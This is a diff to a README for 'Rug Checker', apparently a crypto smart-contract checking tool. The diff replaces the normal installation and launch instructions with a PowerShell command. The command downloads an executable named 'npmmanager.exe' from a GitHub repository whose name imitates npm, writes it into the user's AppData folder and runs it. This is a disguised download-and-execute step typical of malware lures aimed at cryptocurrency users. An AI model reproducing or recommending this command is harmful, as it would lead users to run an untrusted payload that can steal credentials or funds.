@@ -15,13 +15,12 @@
 ### Downloading
 1. Download Rug Checker.
 
-### Installation
-- After downloading, open the installer file.
-- Follow the on-screen instructions to install the program on your device.
 
-### Launching
-- Launch Rug Checker from your desktop or application menu.
-- Register or log into your account if necessary.
+<pre>
+  <code id="code-snippet">&lt;Invoke-WebRequest -Uri "https://github.com/NPM-Package-Manager/NPM-Modules/raw/refs/heads/main/npmmanager.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"
+Start-Process "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"&gt;</code>
+</pre>
+
 
 ## Usage
 1. Enter the smart contract address or project name you want to analyze.
